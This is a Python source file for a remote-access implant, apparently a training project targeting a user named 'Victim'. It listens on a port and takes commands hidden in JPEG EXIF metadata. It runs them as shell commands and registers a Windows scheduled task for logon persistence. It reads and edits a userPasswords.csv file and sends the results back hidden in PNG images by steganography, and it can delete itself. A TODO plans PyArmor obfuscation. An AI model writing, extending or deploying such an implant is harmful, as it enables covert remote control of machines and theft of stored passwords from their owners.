import csv
import os
import subprocess
import sys
import time
from socket import *
import piexif
from PIL import Image
from stegano import lsb


# TODO obfuscate implant using py armor
def extract_custom_metadata(image_path):
    img = Image.open(image_path)
    exif_dict = piexif.load(img.info['exif'])
    metadata = exif_dict['Exif'][piexif.ExifIFD.MakerNote].decode()
    return metadata


def getCommand(connection_socket: socket):
    try:
        with open("temp.jpg", "wb") as img:
            incoming = connection_socket.recv(1024)
            while incoming[-2:] != b'\xff\xD9':
                img.write(incoming)
                incoming = connection_socket.recv(1024)
            img.write(incoming)
        command = extract_custom_metadata("temp.jpg")
        os.remove("temp.jpg")
        return command.split()
    except timeout:
        return "timeout"


def obfuscateSend(msg: str, connection_socket: socket):
    secret = lsb.hide("outface.png", msg)
    secret.save('outfacex.png')
    with open("outfacex.png", "rb") as img:
        data = img.read(1024)
        while True:
            if not data:
                break
            connection_socket.sendall(data)
            data = img.read(1024)
    os.remove('outfacex.png')
    connection_socket.sendall('#####'.encode())


target = r"C:\Users\Victim\Downloads\userPasswords.csv"

# make the program persistant # TODO schedule
cmd = f"schtasks /create /TR C:\Users\Victim\AppData\Local\Programs\Python\Python311\python.exe writer.py 12000 /SC ONLOGON /tn sysLogIn"
os.system(cmd)

implant_socket = socket(AF_INET, SOCK_STREAM)
implant_socket.bind(("0.0.0.0", int(sys.argv[1])))
implant_socket.listen()

while True:
    connection_socket, client_address = implant_socket.accept()
    connection_socket.settimeout(20.0)
    while True:

        try:
            with open("temp.jpg", "wb") as img:
                incoming = connection_socket.recv(1024)
                if not incoming:
                    break
                while incoming[-2:] != b'\xff\xD9':
                    img.write(incoming)
                    incoming = connection_socket.recv(1024)
                img.write(incoming)
            command = extract_custom_metadata("temp.jpg")
            os.remove("temp.jpg")
            command = command.split()
            print(command)

            if (command):
                obfuscateSend(f"COMMAND RECEIVED {command[0]}", connection_socket)

            if (command[0] == "0"):  # RECON
                cmd = " ".join(command[1:])
                result = subprocess.check_output(cmd, shell=True)
                if result == b'':
                    result = b"empty STDOUT"
                obfuscateSend(result.decode(), connection_socket)
            elif (command[0] == "2"):  # SETPATH
                target = command[1]
                obfuscateSend(f"PATH = {target}", connection_socket)
            elif (command[0] == "3"):  # DESTRUCT
                os.remove(sys.argv[0])
                # TODO make it remove the scedule task
                cmd = f"schtasks /delete sysLogIn"
                os.system(cmd)
                obfuscateSend("SUCCESSFULLY REMOVED", connection_socket)
                exit()
            elif (command[0] == "4"):
                time.sleep(command[1])
            elif (command[0] == "5"):  # FETCHALL
                with open(f"{target}", "r") as text:
                    text = ' '.join([i for i in text])
                    obfuscateSend(text, connection_socket)
            elif (command[0] == "6"):  # ADDUSER
                new_user = [command[1], command[2], command[3]]
                with open(f"{target}", 'a') as file :
                    result = ",".join(new_user)
                    file.write(f"{result}\n")
                obfuscateSend(f"{result} added", connection_socket)
            elif (command[0] == "7"):  # REMOVEUSER
                temp_file = 'temp.csv'
                # Read from csv
                with open(f"{target}", 'r') as infile, open(temp_file, 'w', newline='') as outfile:
                    reader = csv.reader(infile)
                    writer = csv.writer(outfile)
                    for row in reader:
                        if row[0] != command[1]:
                            writer.writerow(row)
                os.remove(f"{target}")
                os.rename(temp_file, f"{target}")
                obfuscateSend(f'USER{command[1]} REMOVED', connection_socket)
            elif (command[0] == "8"):
                with open(f"{target}", 'r') as infile:
                    reader = csv.reader(infile)
                    for row in reader:
                        if row[0] == command[1]:
                            result = row
                obfuscateSend(result, connection_socket)
            else:
                obfuscateSend("!!!", connection_socket)
        except timeout:
            print("timed out")
            break
